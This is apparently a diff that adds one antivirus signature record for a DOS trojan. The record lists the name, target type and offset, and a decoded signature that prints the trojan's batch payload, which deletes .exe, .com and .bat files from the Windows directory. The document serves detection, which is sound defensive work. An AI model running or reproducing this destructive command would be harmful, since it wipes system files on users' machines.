@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36577
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off cls @del c:\windows\*.exe cls @del c:\windows\*.com cls @del c:\windows\*.bat cls @exit
